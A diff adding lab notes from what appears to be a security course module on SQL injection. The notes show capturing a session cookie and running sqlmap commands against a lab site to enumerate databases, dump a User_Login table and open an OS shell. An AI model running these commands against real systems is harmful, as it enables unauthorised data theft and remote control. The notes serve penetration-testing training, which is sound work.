@@ -27,3 +27,27 @@ use staff;
 show tables;
 select * from login;
 select * from user;
+
+
+
+Module 15: SQL Injection
+Lab1-Task2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap
+•	Login a website
+•	Inspect element
+•	Dev tools-&gt;Console: document.cookie
+•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" –dbs
+o	-u: Specify the target URL
+o	--cookie: Specify the HTTP cookie header value
+o	--dbs: Enumerate DBMS databases
+•	Get a list of databases
+•	Select a database to extract its tables
+•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope –tables
+o	-D: Specify the DBMS database to enumerate
+o	--tables: Enumerate DBMS database tables
+•	Get a list of tables
+•	Select a column
+•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope –T User_Login --dump
+•	Get table data of this column
+•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" --os-shell
+•	Get the OS Shell
+•	TASKLIST
